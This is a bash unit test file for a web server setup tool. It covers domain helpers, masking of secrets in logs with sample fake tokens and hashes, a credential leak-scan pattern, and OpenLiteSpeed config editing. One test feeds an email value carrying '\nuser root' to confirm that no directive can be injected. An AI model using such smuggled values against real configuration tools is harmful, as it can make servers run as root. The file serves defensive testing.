#!/usr/bin/env bash
# tests/unit.sh - offline unit tests for the pure bash/awk logic of setup.sh.
# Runs without root and without network on any machine with bash 5, awk, jq, openssl.
#   bash tests/unit.sh
set -Eeuo pipefail
shopt -s lastpipe
HERE="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
ROOT="$(dirname "$HERE")"
TMP="$(mktemp -d "${TMPDIR:-/tmp}/ss-unit.XXXXXX")"
cleanup() { rm -rf "$TMP"; }

# ---- globals normally provided by setup.sh (all paths redirected into TMP) --
SCRIPT_VERSION="test"; SCRIPT_VERSION_LINE="1.0"
TIMEZONE="Europe/Istanbul"; ADMIN_PORT="7080"; PHP_VERSION="8.3"; ADMIN_ACCESS="tunnel"; ADMIN_ALLOWED_IP=""; DEFAULT_EMAIL=""; SSH_PORT=""
DB_BUFFER_PERCENT=""; REDIS_MAX_PERCENT=""; BACKUP_KEEP="7"; BACKUP_SCHEDULE=""; FAIL2BAN_IGNORE_IP=""
STATE_DIR="$TMP/state"; SITES_ROOT="$TMP/home"; SITES_LOG_ROOT="$TMP/sitelogs"; LSWS_HOME="$TMP/lsws"; LOG_FILE="$TMP/server_setup.log"
BACKUP_ROOT="$TMP/backups"; ACME_ROOT="$TMP/acme"; SSL_DEPLOY_DIR="$TMP/ssl"
SYSCTL_FILE="$TMP/sysctl.conf"; LIMITS_FILE="$TMP/limits.conf"; MARIADB_TUNED_FILE="$TMP/60-tuned.cnf"
FAIL2BAN_JAIL_FILE="$TMP/jail.conf"; FAIL2BAN_WEB_JAIL_FILE="$TMP/jail-web.conf"; CRON_FILE="$TMP/cron"
FAIL2BAN_FILTER_DIR="$TMP/f2b-filters"
CERTBOT_DEPLOY_HOOK="$TMP/hook.sh"; LOGROTATE_SITES_FILE="$TMP/lr-sites"; LOGROTATE_SELF_FILE="$TMP/lr-self"
INSTALL_DIR="$TMP/install"; BIN_LINK="$TMP/lompstack"; BIN_SHORT="$TMP/lomp"; LOCK_FILE="$TMP/lock"
OPT_YES=1 OPT_DRY_RUN=0 OPT_QUIET=1 OPT_VERBOSE=0 OPT_NO_COLOR=1 OPT_JSON=0 OPT_NON_INTERACTIVE=1
SCRIPT_PATH="$ROOT/setup.sh"; SCRIPT_DIR="$ROOT"
export TMPDIR="$TMP"
for m in common lang system ols php db ssl domain harden scan proxy app mail webmail cloudflare backup monitor install import rename menu; do
  # shellcheck source=/dev/null
  source "$ROOT/lib/$m.sh"
done
trap cleanup EXIT
mkdir -p "$STATE_DIR" "$LSWS_HOME/conf/vhosts" "$SITES_ROOT"; : >"$LOG_FILE"
chown() { return 0; }   # no lsadm/site users on the test machine
# nor can the suite switch users: run the command as whoever runs the tests, and keep a record
RUNUSER_LOG="$TMP/runuser.log"
runuser() {
  printf '%s\n' "$*" >>"$RUNUSER_LOG"
  [[ "${1:-}" == "-u" && -n "${2:-}" && "${3:-}" == "--" ]] || return 1
  shift 3
  "$@"
}
# nor are there ACL tools everywhere, or an OpenLiteSpeed user to name: a record again
SETFACL_LOG="$TMP/setfacl.log"
setfacl() { printf '%s\n' "$*" >>"$SETFACL_LOG"; }
# Git Bash runs the native jq.exe, which writes CRLF unless given -b: a multi-line result then
# carries a \r at the end of every line but the last. Servers and CI (Linux) are unaffected.
if [[ "${OSTYPE:-}" == msys* || "${OSTYPE:-}" == cygwin* ]]; then
  jq() { command jq -b "$@"; }
fi

# Some filesystems (MSYS/NTFS under Git Bash) ignore chmod, so permission assertions
# only run where they are meaningful. On Linux and in CI they always run.
CAN_CHMOD=0
: >"$TMP/.permprobe"; chmod 0600 "$TMP/.permprobe" 2>/dev/null || true
[[ "$(stat -c %a "$TMP/.permprobe" 2>/dev/null || true)" == "600" ]] && CAN_CHMOD=1
rm -f "$TMP/.permprobe"
# MSYS under Git Bash copies instead of linking, so symlink assertions only run elsewhere
CAN_SYMLINK=0
: >"$TMP/.symtarget"
ln -sfn "$TMP/.symtarget" "$TMP/.symprobe" 2>/dev/null && [[ -L "$TMP/.symprobe" ]] && CAN_SYMLINK=1
rm -f "$TMP/.symprobe" "$TMP/.symtarget"

PASS=0; FAIL=0
ok()   { PASS=$((PASS + 1)); }
fail() { FAIL=$((FAIL + 1)); printf 'FAIL: %s\n' "$*" >&2; }
assert_eq()    { if [[ "$2" == "$3" ]]; then ok; else fail "$1: expected [$2] got [$3]"; fi; }
assert_true()  { local n="$1"; shift; if "$@"; then ok; else fail "$n"; fi; }
assert_false() { local n="$1"; shift; if "$@"; then fail "$n (expected failure)"; else ok; fi; }
assert_has()   { if [[ "$3" == *"$2"* ]]; then ok; else fail "$1: missing [$2]"; fi; }
assert_lacks() { if [[ "$3" != *"$2"* ]]; then ok; else fail "$1: unexpected [$2]"; fi; }
section() { printf '%s\n' "-- $*"; }
# Run a function the way the installer does (errexit armed) and report its exit status.
# A plain "if func; then" would disable errexit and hide exactly the bugs we look for.
# The subshell must not be the left side of "||": that suppresses errexit inside it, which is
# the very failure mode this helper exists to catch. errexit is turned off around the call
# instead, and put back exactly as it was.
run_isolated() {
  local rc=0 armed="" prev=""
  case "$-" in *e*) armed=1 ;; esac
  # the ERR trap would report the failing subshell as an unexpected failure and end the
  # command substitution this runs in, before the status could be printed
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  ( set -Eeuo pipefail; shopt -s lastpipe; "$@" ) >/dev/null 2>&1
  rc=$?
  [[ -z "$armed" ]] || set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}

# =============================================================================
section "domain helpers"
assert_true  "valid example.com"       lib_domain_valid example.com
assert_true  "valid sub.example.co.uk" lib_domain_valid sub.example.co.uk
assert_true  "valid uppercase"         lib_domain_valid EXAMPLE.COM
assert_false "invalid leading dash"    lib_domain_valid -bad.com
assert_false "invalid no dot"          lib_domain_valid localhost
assert_false "invalid double dot"      lib_domain_valid a..b.com
assert_false "invalid underscore"      lib_domain_valid exa_mple.com
assert_eq "ident example.com" "example_com" "$(lib_domain_ident example.com)"
assert_eq "ident digits first" "s_123_com" "$(lib_domain_ident 123.com)"
assert_eq "ident dashes" "my_site_co_uk" "$(lib_domain_ident my-site.co.uk)"
assert_eq "ident length" 28 "$(lib_domain_ident averyveryveryverylongdomainname.example.com | wc -c | tr -d ' ')"
assert_eq "size 64M" 64 "$(lib_size_to_mb 64M)"
assert_eq "size 1G" 1024 "$(lib_size_to_mb 1G)"
assert_eq "size empty" 0 "$(lib_size_to_mb "")"
assert_true "version ge" lib_version_ge 10.11.2 10.6
assert_false "version lt" lib_version_ge 10.6.12 10.11
assert_eq "human mb" "2.0 GB" "$(lib_human_mb 2048)"
assert_eq "password length" 32 "$(lib_random_password | wc -c | tr -d ' ')"
is_alnum20() { [[ "$1" =~ ^[A-Za-z0-9]{20}$ ]]; }
assert_true "password alnum" is_alnum20 "$(lib_random_password 20)"

# =============================================================================
section "secret masking"
m() { printf '%s' "$1" | lib_mask_secrets; }
assert_eq "mask password=" "password=********" "$(m 'password=abc123')"
assert_eq "mask PASSWORD: quoted" "PASSWORD: '********'" "$(m "PASSWORD: 'abc123'")"
assert_eq "mask identified by" "IDENTIFIED BY '********'" "$(m "IDENTIFIED BY 'S3cr3t!'")"
assert_eq "mask bearer" "Authorization: Bearer ********" "$(m 'Authorization: Bearer abcDEF.123-x')"
assert_eq "mask cf token" "dns_cloudflare_api_token = ********" "$(m 'dns_cloudflare_api_token = q1w2e3r4')"
assert_eq "mask pass:" "-pass pass:********" "$(m '-pass pass:hunter2')"
assert_eq "mask telegram url" "https://api.telegram.org/bot********/sendMessage" "$(m 'https://api.telegram.org/bot123:ABC/sendMessage')"
assert_eq "no false positive" "wrote /etc/ssh/sshd_config.d/99-server-setup.conf" "$(m 'wrote /etc/ssh/sshd_config.d/99-server-setup.conf')"
assert_eq "no mask PasswordAuthentication" "PasswordAuthentication no" "$(m 'PasswordAuthentication no')"
# Every secret this tool accepts on the command line is SPACE separated, and setup.sh logs
# the whole argument vector. A key=value-only masker let live tokens into the log.
assert_eq "mask --cf-api-token"   "args='--cf-api-token ********'"   "$(m "args='--cf-api-token Xv8sQ2pLm9TzR4kWn1bYc7dEf0g'")"
assert_eq "mask --smtp-pass"      "--smtp-pass ********"             "$(m '--smtp-pass hunter2secret')"
assert_eq "mask --telegram-token" "--telegram-token ********"        "$(m '--telegram-token 123456:ABCdefGhi')"
assert_eq "mask --api-key"        "--api-key ********"               "$(m '--api-key abcd1234efgh')"
assert_eq "mask redis requirepass line" "requirepass ********"       "$(m 'requirepass S3cr3tRedisPass')"
assert_eq "mask msmtp password line"    "password ********"          "$(m 'password S3cr3tSmtpPass')"
assert_eq "mask json token"       '"token":"********"'               "$(m '"token":"abcd1234efgh"')"
assert_eq "no mask --key-type"    "--key-type ecdsa -d mail.x.com"   "$(m '--key-type ecdsa -d mail.x.com')"
assert_eq "no mask --admin-ip"    "--admin-ip 203.0.113.5"           "$(m '--admin-ip 203.0.113.5')"
assert_eq "no mask --backup-keep" "--backup-keep 7"                  "$(m '--backup-keep 7')"
assert_eq "no mask --admin-port"  "--admin-port 7080"                "$(m '--admin-port 7080')"
# git remotes and connection strings carry the credential inside the URL itself
assert_eq "mask url user:secret"      "--git https://oauth2:********@gitlab.com/g/r.git" "$(m '--git https://oauth2:glpat-Ab12Cd34Ef56@gitlab.com/g/r.git')"
assert_eq "mask token as url user"    "https://********@github.com/o/r.git"              "$(m 'https://ghp_1234567890abcdefghijKLMNOP@github.com/o/r.git')"
assert_eq "mask connection string"    "mysql://app:********@127.0.0.1:3306/app"          "$(m 'mysql://app:S3cr3tPw@127.0.0.1:3306/app')"
assert_eq "mask empty-user url"       "redis://:********@127.0.0.1:6379"                 "$(m 'redis://:S3cr3tPw@127.0.0.1:6379')"
assert_eq "no mask ssh remote user"   "ssh://git@github.com/o/r.git"                     "$(m 'ssh://git@github.com/o/r.git')"
assert_eq "no mask scp-style remote"  "git@github.com:o/r.git"                           "$(m 'git@github.com:o/r.git')"
assert_eq "no mask short url user"    "https://bob@bitbucket.org/w/r.git"                "$(m 'https://bob@bitbucket.org/w/r.git')"
assert_eq "no mask host:port url"     "http://127.0.0.1:3000/health"                     "$(m 'http://127.0.0.1:3000/health')"
# the doctor leak scan must see exactly what the masker masks, or it reports a clean log
leak_hit() { grep -Eqi "$(lib_secret_leak_pattern)" <<<"$1"; }
assert_true  "doctor sees a leaked flag token"   leak_hit "args='--cf-api-token Xv8sQ2pLm9TzR4kWn1bYc7dEf0g'"
assert_true  "doctor sees a leaked key=value"    leak_hit "password=S3cr3tValue123"
assert_true  "doctor sees a leaked requirepass"  leak_hit "requirepass S3cr3tRedisPass"
assert_false "doctor ignores a masked line"      leak_hit "args='--cf-api-token ********'"
assert_false "doctor ignores PasswordAuthentication" leak_hit "PasswordAuthentication no"
assert_true  "doctor sees credentials in a url"      leak_hit "--git https://oauth2:glpat-Ab12Cd34Ef56@gitlab.com/g/r.git"
assert_true  "doctor sees a token used as url user"  leak_hit "https://ghp_1234567890abcdefghijKLMNOP@github.com/o/r.git"
assert_false "doctor ignores a masked url"           leak_hit "https://oauth2:********@gitlab.com/g/r.git"
assert_false "doctor ignores a masked token url"     leak_hit "https://********@github.com/o/r.git"
assert_false "doctor ignores an ssh remote"          leak_hit "ssh://git@github.com/o/r.git"
assert_false "doctor ignores a host:port url"        leak_hit "http://127.0.0.1:3000/health"
# every masked shape must also be one the leak scan recognises before masking
for _s in 'https://oauth2:glpat-Ab12Cd34Ef56@gitlab.com/g/r.git' 'https://ghp_1234567890abcdefghijKLMNOP@github.com/o/r.git' 'mysql://app:S3cr3tPw@127.0.0.1:3306/app'; do
  assert_false "masked form of ${_s%%@*}@... is clean" leak_hit "$(m "$_s")"
done
# a mail server hands the log two more shapes: password hashes and private keys. A hash is not
# a password, but it is worth an offline attack, and neither belongs in a world-readable log.
assert_eq "mask a dovecot hash"  "info@example.com:{BLF-CRYPT}********" "$(m 'info@example.com:{BLF-CRYPT}$2y$10$abcdefghijklmnopqrstuv')"
assert_eq "mask a bare bcrypt hash" 'hash $2y$********'                 "$(m 'hash $2y$10$Abcdefghijklmnopqrstuv')"
assert_eq "mask a sha512-crypt hash" 'hash $6$********'                 "$(m 'hash $6$rounds=5000$saltsalt$Abcdefghij')"
assert_eq "mask roundcube des_key" "des_key = ********"                 "$(m 'des_key = rcmail24ByteDESkeyStr')"
_pem=$'-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ\n-----END PRIVATE KEY-----'
# the markers go too: the leak scan looks for them, and a masked line must not trip it
assert_eq "mask a whole private key" $'********\n********\n********' "$(m "$_pem")"
assert_true  "doctor sees a leaked hash"        leak_hit 'info@example.com:{BLF-CRYPT}$2y$10$abcdefghijklmnopqrstuv'
assert_true  "doctor sees a leaked private key" leak_hit "$_pem"
assert_false "doctor ignores the masked hash"   leak_hit "$(m 'info@example.com:{BLF-CRYPT}$2y$10$abcdefghijklmnopqrstuv')"
assert_false "doctor ignores the masked key"    leak_hit "$(m "$_pem")"
assert_false "doctor ignores an ordinary path"  leak_hit '/var/vmail/example.com/info/Maildir'

# =============================================================================
section "OpenLiteSpeed config editing (awk)"
cat >"$LSWS_CONF" <<'EOF'
#
# PLAIN TEXT CONFIGURATION FILE
#
serverName
user                             nobody
group                            nogroup
showVersionNumber                0
adminEmails                      root@localhost

tuning{
    maxConnections               10000
    maxSSLConnections            10000
    keepAliveTimeout             5
    quicEnable                   1
}

accessControl{
	allow                                   ALL
	deny
}

extProcessor lsphp{
    type                            lsapi
    address                         uds://tmp/lshttpd/lsphp.sock
    env                             PHP_LSAPI_CHILDREN=10
    path                            fcgi-bin/lsphp
}

scriptHandler{
    add lsapi:lsphp  php
}

virtualHost Example{
    vhRoot                   Example/
    configFile               conf/vhosts/Example/vhconf.conf
    setUIDMode               0
}

listener Default{
    address                  *:8088
    secure                   0
    map                      Example *
}

vhTemplate centralConfigLog{
    templateFile             conf/templates/ccl.conf
    listeners                Default
}

vhTemplate EasyRailsWithSuEXEC{
    templateFile             conf/templates/rails.conf
    listeners                Default
}

vhTemplate mine{
    templateFile             conf/templates/mine.conf
    listeners                HTTP
}

module cache {
    ls_enabled          1
    enableCache         0
}
EOF
lib_ols_tx_begin
assert_eq "top get showVersionNumber" "0" "$(lib_ols_tx_top_get showVersionNumber)"
assert_eq "top get user" "nobody" "$(lib_ols_tx_top_get user)"
assert_eq "top get missing" "" "$(lib_ols_tx_top_get httpdWorkers)"
lib_ols_tx_top_set httpdWorkers 2
assert_eq "top set new key" "2" "$(lib_ols_tx_top_get httpdWorkers)"
assert_true "new key placed before first block" bash -c "awk '/^httpdWorkers/{k=NR} /^tuning/{t=NR} END{exit !(k && t && k<t)}' '$OLS_TX_FILE'"
lib_ols_tx_top_set showVersionNumber 0
assert_eq "top set existing (idempotent)" "1" "$(grep -c '^showVersionNumber' "$OLS_TX_FILE")"
lib_ols_tx_top_set adminEmails "admin@example.com"
assert_eq "top set existing value" "admin@example.com" "$(lib_ols_tx_top_get adminEmails)"
assert_eq "block get tuning key" "10000" "$(lib_ols_tx_block_get tuning "" maxConnections)"
lib_ols_tx_block_set tuning "" maxConnections 5000
assert_eq "block set tuning key" "5000" "$(lib_ols_tx_block_get tuning "" maxConnections)"
lib_ols_tx_block_set tuning "" totalInMemCacheSize 64M
assert_eq "block set new tuning key" "64M" "$(lib_ols_tx_block_get tuning "" totalInMemCacheSize)"
assert_eq "tuning still one block" "1" "$(grep -c '^tuning' "$OLS_TX_FILE")"
assert_true  "block exists case-insensitive" lib_ols_tx_block_exists virtualhost Example
assert_true  "block exists extprocessor" lib_ols_tx_block_exists extprocessor lsphp
assert_false "block not exists" lib_ols_tx_block_exists virtualhost Nope
assert_eq "extprocessor path get" "fcgi-bin/lsphp" "$(lib_ols_tx_block_get extprocessor lsphp path)"
lib_ols_tx_block_set extprocessor lsphp path /usr/local/lsws/lsphp83/bin/lsphp
assert_eq "extprocessor path set" "/usr/local/lsws/lsphp83/bin/lsphp" "$(lib_ols_tx_block_get extprocessor lsphp path)"
assert_eq "listener Default address" "*:8088" "$(lib_ols_tx_block_get listener Default address)"
lib_ols_tx_block_remove virtualhost Example
assert_false "block removed" lib_ols_tx_block_exists virtualhost Example
assert_true  "other blocks intact after remove" lib_ols_tx_block_exists listener Default
_ols_tx_drop_stock_templates
assert_true  "stock templates stay while their listener exists" lib_ols_tx_block_exists vhTemplate centralConfigLog
lib_ols_tx_block_remove listener Default
assert_false "listener removed" lib_ols_tx_block_exists listener Default
_ols_tx_drop_stock_templates
assert_false "a stock template on the removed listener is dropped" lib_ols_tx_block_exists vhTemplate centralConfigLog
assert_false "and the other one"                                   lib_ols_tx_block_exists vhTemplate EasyRailsWithSuEXEC
assert_true  "a template on another listener is kept"              lib_ols_tx_block_exists vhTemplate mine
assert_true "braces balanced after edits" _ols_braces_balanced "$OLS_TX_FILE"

SYS_IPV6=0
_ols_tx_listeners_ensure
assert_true "listener HTTP created" lib_ols_tx_block_exists listener HTTP
assert_true "listener HTTPS created" lib_ols_tx_block_exists listener HTTPS
assert_eq "HTTP address" "*:80" "$(lib_ols_tx_block_get listener HTTP address)"
assert_eq "HTTPS sslProtocol" "24" "$(lib_ols_tx_block_get listener HTTPS sslProtocol)"
assert_eq "HTTPS default map" "*" "$(lib_ols_tx_map_get HTTPS _default)"
_ols_tx_listeners_ensure
assert_eq "listeners ensure idempotent" "1" "$(grep -c '^listener HTTPS' "$OLS_TX_FILE")"
assert_eq "map lines not duplicated" "1" "$(awk '/^listener HTTPS/,/^}/' "$OLS_TX_FILE" | grep -c 'map ')"
lib_ols_tx_map_set HTTP example.com "example.com, www.example.com"
assert_eq "map set" "example.com, www.example.com" "$(lib_ols_tx_map_get HTTP example.com)"
lib_ols_tx_map_set HTTP example.com "example.com"
assert_eq "map replace" "example.com" "$(lib_ols_tx_map_get HTTP example.com)"
assert_eq "map count" "2" "$(awk '/^listener HTTP \{/,/^}/' "$OLS_TX_FILE" | grep -c 'map ')"
lib_ols_tx_map_del HTTP example.com
assert_eq "map del" "" "$(lib_ols_tx_map_get HTTP example.com)"
assert_eq "default map kept" "*" "$(lib_ols_tx_map_get HTTP _default)"
lib_ols_render_extprocessor 8.3 12 | lib_ols_tx_block_put extprocessor lsphp83
assert_eq "extprocessor put" "12" "$(lib_ols_tx_block_get extprocessor lsphp83 maxConns)"
lib_ols_render_extprocessor 8.3 6 | lib_ols_tx_block_put extprocessor lsphp83
assert_eq "extprocessor replace" "6" "$(lib_ols_tx_block_get extprocessor lsphp83 maxConns)"
assert_eq "extprocessor single" "1" "$(grep -c '^extprocessor lsphp83' "$OLS_TX_FILE")"
assert_eq "block names" "$(printf 'lsphp\nlsphp83')" "$(_ols_block_names "$OLS_TX_FILE" extprocessor)"
assert_true "braces balanced after listeners" _ols_braces_balanced "$OLS_TX_FILE"
lib_ols_tx_commit
assert_eq "commit changed" "1" "$OLS_CONF_CHANGED"
assert_true "committed file balanced" _ols_braces_balanced "$LSWS_CONF"
lib_ols_tx_begin; lib_ols_tx_commit
assert_eq "commit idempotent" "0" "$OLS_CONF_CHANGED"
assert_eq "conf vhosts after edits" "" "$(lib_ols_conf_vhosts)"

# heredoc awareness
cat >"$TMP/vh.conf" <<'EOF'
docRoot                   $VH_ROOT/public_html/
rewrite  {
  enable                  1
  rules                   <<<END_rules
RewriteCond %{HTTPS} !on
RewriteRule ^(.*)$ https://%{HTTP_HOST}$1 [R=301,L]
# a stray { brace } inside the heredoc must be ignored
  END_rules
}
context / {
  location                $VH_ROOT/public_html/
  allowBrowse             1
}
EOF
assert_true "heredoc braces balanced" _ols_braces_balanced "$TMP/vh.conf"
assert_eq "span skips heredoc" "2 9" "$(_ols_span "$TMP/vh.conf" rewrite "")"
assert_eq "context key after heredoc" "1" "$(_ols_block_key "$TMP/vh.conf" context / allowBrowse get)"
printf 'a {\n  b {\n}\n' >"$TMP/bad.conf"
_bal() { _ols_braces_balanced "$1" >/dev/null 2>&1; }   # the reason goes to stdout now
assert_false "unbalanced detected" _bal "$TMP/bad.conf"

# =============================================================================
section "OpenLiteSpeed surgery: audit regressions"
rc_nonzero() { [[ "$(run_isolated "$@")" != "0" ]]; }
_why() { _ols_braces_balanced "$1" 2>/dev/null | grep -oE 'line [0-9]+' | head -1 || true; }
_quiet() { "$@" >/dev/null 2>&1; }
cp "$LSWS_CONF" "$TMP/conf.before-audit"   # this section rewrites it; later sections need it back

# -- a value must not be able to become a second directive -------------------
# "awk -v v=..." applies backslash escape processing, so the two characters \n arrived as a
# real newline and "install --email 'x@y.z\nuser root'" rewrote the server's uid.
cat >"$LSWS_CONF" <<'EOF'
serverName
user                      nobody
adminEmails               root@localhost

tuning  {
  maxConnections          10000
}
EOF
lib_ols_tx_begin
lib_ols_tx_top_set adminEmails 'ops@example.com\nuser root\ngroup root'
assert_eq "backslash-n is stored literally" 'ops@example.com\nuser root\ngroup root' "$(lib_ols_tx_top_get adminEmails)"
assert_eq "no directive injected"  "0"      "$(grep -c '^user root' "$OLS_TX_FILE" || true)"
assert_eq "user directive untouched" "nobody" "$(lib_ols_tx_top_get user)"
lib_ols_tx_block_set tuning "" maxConnections 'a\tb'
assert_eq "tab escape stored literally" 'a\tb' "$(lib_ols_tx_block_get tuning "" maxConnections)"
assert_true "a real newline in a value is refused" rc_nonzero lib_ols_tx_top_set adminEmails "$(printf 'a@b.c\nuser root')"
assert_false "email validation rejects the injection" lib_email_valid 'ops@example.com\nuser root'
assert_false "email validation rejects a space"       lib_email_valid 'a b@example.com'
assert_true  "email validation accepts a normal one"  lib_email_valid 'ops@example.com'
assert_true  "email validation accepts a subdomain"   lib_email_valid 'ops@mail.example.co.uk'

# -- keys OpenLiteSpeed lets repeat ------------------------------------------
cat >"$LSWS_CONF" <<'EOF'
extProcessor lsphp{
  type                    lsapi
  env                     LSAPI_AVOID_FORK=200M
  env                     PHP_LSAPI_CHILDREN=10
  path                    fcgi-bin/lsphp
}
EOF
lib_ols_tx_begin
lib_ols_tx_block_set_multi extprocessor lsphp env "PHP_LSAPI_CHILDREN=48" "PHP_LSAPI_CHILDREN="
assert_eq "the operator's env line survives" "1" "$(grep -c 'LSAPI_AVOID_FORK=200M' "$OLS_TX_FILE")"
assert_eq "our env line is updated"          "1" "$(grep -c 'PHP_LSAPI_CHILDREN=48' "$OLS_TX_FILE")"
assert_eq "no stale value left"              "0" "$(grep -c 'PHP_LSAPI_CHILDREN=10' "$OLS_TX_FILE" || true)"
lib_ols_tx_block_set extprocessor lsphp type lsapi
assert_eq "a single-valued key still collapses duplicates" "1" "$(grep -c '^  type' "$OLS_TX_FILE")"

# -- a map that cannot land must not be silent -------------------------------
# _ols_map only emits inside a listener block; with none matching it echoed its input and
# exited 0, leaving the site registered but bound to nothing (served 403 by the catch-all).
printf 'serverName\nlistener Renamed {\n  address                 *:80\n}\n' >"$LSWS_CONF"
lib_ols_tx_begin
assert_true "a map onto a missing listener is fatal" rc_nonzero lib_ols_tx_map_set HTTP example.com "example.com"

# -- structure diagnostics name the line -------------------------------------
printf 'tuning  {\n  maxConnections 1\n}   # bumped for the campaign\n' >"$TMP/c1.conf"
assert_false "trailing text after } is rejected" _bal "$TMP/c1.conf"
assert_eq "and the line is named" "line 3" "$(_why "$TMP/c1.conf")"
assert_eq "an unclosed block names where it opened" "line 1" "$(_why "$TMP/bad.conf")"
printf 'rewrite {\n  rules  <<<END_r\nRewriteRule ^(.*)$ https://%%{HTTP_HOST}$1 [R=301,L]\n  END_r\n}\n' >"$TMP/c2.conf"
assert_true "a value containing } is not mistaken for a close" _bal "$TMP/c2.conf"

# -- a commented-out block must not skew the depth counter -------------------
# OpenLiteSpeed drops every '#' line before it looks at structure; this parser did not, so
# commenting a block out made every later block lookup silently return nothing.
cat >"$TMP/c3.conf" <<'EOF'
serverName
#expires  {
#  enableExpires           1
#}
tuning  {
  maxConnections          10000
}
listener HTTP {
  address                 *:80
}
EOF
assert_true "a commented-out block parses"  _bal "$TMP/c3.conf"
assert_eq "later blocks are still found"    "5 7"   "$(_ols_span "$TMP/c3.conf" tuning "")"
assert_eq "later block names are still found" "HTTP" "$(_ols_block_names "$TMP/c3.conf" listener)"
assert_eq "later keys are still readable"   "10000" "$(_ols_block_key "$TMP/c3.conf" tuning "" maxConnections get)"

# -- refuse before the surgery, not after ------------------------------------
cp "$TMP/c1.conf" "$LSWS_CONF"
assert_true "tx_begin refuses an unparseable file" rc_nonzero lib_ols_tx_begin
cp "$TMP/c3.conf" "$LSWS_CONF"
assert_false "tx_begin accepts a parseable one" rc_nonzero lib_ols_tx_begin

# -- the rollback point must be real -----------------------------------------
mkdir -p "$LSWS_HOME/admin/conf"
printf 'listener adminListener {\n  address                 127.0.0.1:7080\n}\n' >"$LSWS_ADMIN_CONF"
snap="$(lib_ols_snapshot_take)"
assert_true "snapshot written" test -f "$snap"
assert_eq "admin_config.conf is in the snapshot" "1" "$(tar -tzf "$snap" | grep -c 'admin/conf/admin_config.conf')"
assert_false "restoring an empty path reports success" _quiet lib_ols_snapshot_restore ""
# a change set with no rollback point must stop, not proceed and then claim it rolled back
lib_ols_snapshot_take() { return 1; }
lib_ols_is_installed() { return 0; }
assert_true "change_begin refuses without a snapshot" rc_nonzero lib_ols_change_begin
unset -f lib_ols_snapshot_take lib_ols_is_installed

# -- a restore must never nest the saved tree inside the new one -------------
mkdir -p "$TMP/live/sub"; : >"$TMP/live/keep"
mkdir -p "$TMP/newconf"; : >"$TMP/newconf/fresh"
OLS_REJECTED_DIR=""
_ols_swap_dir "$TMP/live" "$TMP/newconf"
assert_true  "live tree replaced"   test -f "$TMP/live/fresh"
assert_false "old tree not kept"    test -f "$TMP/live/keep"
assert_false "no .failed debris"    test -e "$TMP/live.failed"
assert_false "nothing nested"       test -e "$TMP/live/live.failed"
# the rejected configuration is the only copy of what was tried; keep it for diagnosis
mkdir -p "${LSWS_HOME}/conf2"; : >"${LSWS_HOME}/conf2/rejected-marker"
mkdir -p "$TMP/newconf2"; : >"$TMP/newconf2/fresh"
OLS_REJECTED_DIR="$TMP/rejected"; mkdir -p "$OLS_REJECTED_DIR"
_ols_swap_dir "${LSWS_HOME}/conf2" "$TMP/newconf2"
assert_true  "rejected config kept for diagnosis" test -f "${OLS_REJECTED_DIR}/conf2/rejected-marker"
assert_false "and not left beside the live tree"  test -e "${LSWS_HOME}/conf2.failed"
OLS_REJECTED_DIR=""; rm -rf "${LSWS_HOME}/conf2" "$TMP/rejected"

# -- a port conflict must name the culprit -----------------------------------
# OpenLiteSpeed refuses to start at all when it cannot bind the WebAdmin listener, so
# "Address already in use" on that port took the whole web server down with a generic
# "did not come back after the reload" and no mention of the port.
ss() { printf 'LISTEN 0 100 127.0.0.1:7080 0.0.0.0:* users:(("lshttpd",pid=1234,fd=7))\n'; }
assert_eq "the holder is named" "lshttpd (pid 1234)" "$(lib_port_holder 7080)"
assert_eq "a free port has no holder" "" "$(lib_port_holder 9999)"
ss() { printf 'LISTEN 0 100 [::]:7080 [::]:* users:(("caddy",pid=77,fd=3))\n'; }
assert_eq "IPv6 listeners are seen too" "caddy (pid 77)" "$(lib_port_holder 7080)"
ss() { return 0; }
assert_eq "nothing listening" "" "$(lib_port_holder 7080)"
unset -f ss
# OpenLiteSpeed's own reason must reach the failure message
mkdir -p "${LSWS_HOME}/logs"
cat >"${LSWS_HOME}/logs/error.log" <<'EOF'
2026-09-15 16:29:41.623910 [INFO] [30920] [Module: modcompress 1.1] has been initialized successfully
2026-09-15 16:29:45.626111 [ERROR] [30920] HttpListener::start(): Can't listen at address adminListener: Address already in use!
2026-09-15 16:29:45.626284 [ERROR] [30920] Fatal error in configuration, exit!
EOF
ols_err="$(lib_ols_recent_errors 2)"
assert_has "the real reason is extracted" "Address already in use" "$ols_err"
assert_has "and the fatal line too" "Fatal error in configuration" "$ols_err"
assert_lacks "timestamps stripped" "2026-09-15" "$ols_err"
assert_lacks "info lines excluded" "modcompress" "$ols_err"
rm -f "${LSWS_HOME}/logs/error.log"
assert_eq "no log, no noise" "" "$(lib_ols_recent_errors)"

# -- config test must not be stricter than OpenLiteSpeed ---------------------
assert_eq "SERVER_ROOT expanded" "${LSWS_HOME}/conf/vhosts/Shop/vhconf.conf" \
  "$(_ols_expand_macros '$SERVER_ROOT/conf/vhosts/$VH_NAME/vhconf.conf' Shop)"
assert_eq "braced form expanded too" "${LSWS_HOME}/conf/vhosts/Shop/vhconf.conf" \
  "$(_ols_expand_macros '${SERVER_ROOT}/conf/vhosts/${VH_NAME}/vhconf.conf' Shop)"
printf 'virtualHost Shop{\n  configFile              $SERVER_ROOT/conf/vhosts/$VH_NAME/vhconf.conf\n}\n' >"$LSWS_CONF"
mkdir -p "${LSWS_VHOSTS_DIR}/Shop"; printf 'docRoot $VH_ROOT/public_html/\n' >"${LSWS_VHOSTS_DIR}/Shop/vhconf.conf"
assert_true "a macro configFile passes the test" lib_ols_config_test
rm -f "${LSWS_VHOSTS_DIR}/Shop/vhconf.conf"
assert_false "a missing macro configFile still fails" lib_ols_config_test
rm -rf "${LSWS_VHOSTS_DIR}/Shop"

# -- an explicitly empty --static-paths must round-trip ----------------------
lib_domain_state_reset
D_DOMAIN="app.example.com"; D_MODE="proxy"; D_PROXY="127.0.0.1:3000"; D_STATIC_PATHS=""
mkdir -p "$STATE_DIR/domains/app.example.com"
lib_domain_state_json >"$STATE_DIR/domains/app.example.com/domain.json"
assert_eq "empty static paths are persisted as 'none'" "none" \
  "$(lib_json_get "$STATE_DIR/domains/app.example.com/domain.json" '.proxy.static_paths')"
lib_domain_state_load app.example.com
assert_eq "and load back as empty, not as the default" "" "$D_STATIC_PATHS"
